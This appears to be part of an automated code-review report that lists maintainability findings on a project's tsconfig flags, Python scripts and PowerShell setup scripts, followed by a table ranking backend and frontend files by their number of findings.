- **`frontend/tsconfig.json:7`** (maintainability) — `skipLibCheck` speeds up builds but silences errors inside dependency typings. This project consumes large third-party type surfaces (`@univerjs/*`, `recharts`, `react-konva`), so a mismatch in their published `.d.ts` files is silently ignored and can turn…
- **`frontend/tsconfig.json:9`** (maintainability) — No file under `src` imports with an explicit `.ts`/`.tsx` extension, so this flag currently buys nothing, but it permits imports like `./types.ts` that only work as long as `noEmit` stays `true` (tsc rejects them as soon as emit is enabled). It also ties…
- **`frontend/tsconfig.json:11`** (maintainability) — `isolatedModules` is on, but `verbatimModuleSyntax` is not. Enabling it makes type-only imports/exports explicit at the syntax level, so a type that is imported or re-exported without `type` fails typechecking instead of relying on each transpiler's…
- **`frontend/tsconfig.json:14`** (maintainability) — `strict` leaves out the checks that matter most for this data-heavy codebase (heavy array/record indexing in `src/lib/grid.ts`, `src/lib/coords.ts`, `src/studio/*`). Consider enabling `"noUncheckedIndexedAccess": true` and `"exactOptionalPropertyTypes":…
- **`scripts/benchmark_end2end.py:14`** (maintainability) — `config` is imported but never referenced anywhere in this script, so it is dead code (and it additionally forces the backend package import at module load). Remove the import.
- **`scripts/run_backend.ps1:3`** (maintainability) — `Set-Location` (and `$ErrorActionPreference` on line 2) mutate the caller session state permanently: if this file is ever dot-sourced (`. .\scripts\run_backend.ps1`) or invoked with `&` from another script, the caller is left in `backend\` and with a Stop…
- **`scripts/setup_backend.ps1:3`** (maintainability) — `Set-Location` changes the session-wide working directory and is never restored, so after this script finishes (and especially if it is dot-sourced from another script) the caller keeps running in `backend/`, breaking any relative path it used. Use…
- **`scripts/test_backend.ps1:4`** (maintainability) — This diagnostic relies on the terminating behavior of `Write-Error` under the script-scope `$ErrorActionPreference = 'Stop'` and terminates with the generic exit code 1 — the same code pytest uses for "tests failed". CI cannot then distinguish a broken…

Full text and suggestions for these 141 findings are in the JSON export.

## Files with the most findings

| Findings | File |
|---:|---|
| 11 | `backend/app/services/modal_manager.py` |
| 10 | `backend/app/services/cloud_manager.py` |
| 9 | `frontend/src/index.css` |
| 9 | `backend/app/api/projects.py` |
| 9 | `backend/app/api/pages.py` |
| 9 | `backend/app/services/trainer.py` |
| 9 | `backend/app/services/trainer_script.py` |
| 8 | `backend/app/api/training.py` |
| 8 | `backend/app/services/recognition.py` |
| 8 | `backend/app/services/serve_manager.py` |
| 8 | `backend/app/services/training_executor.py` |
| 7 | `backend/app/api/blocks.py` |
| 7 | `backend/app/db.py` |
| 7 | `backend/app/domain/otsl.py` |
| 7 | `backend/app/services/auto_training.py` |
| 7 | `backend/app/services/benchmark.py` |
| 7 | `backend/app/services/auth.py` |
| 7 | `backend/app/services/checkpoint_prepare.py` |
| 7 | `backend/app/services/dataset_builder.py` |
| 7 | `backend/app/services/export_formats.py` |
| 7 | `backend/app/services/model_registry.py` |
| 7 | `backend/app/services/paddle_dataset.py` |
| 7 | `backend/app/services/remote_eval.py` |
| 7 | `backend/app/services/prefill.py` |
| 7 | `backend/app/services/scan.py` |
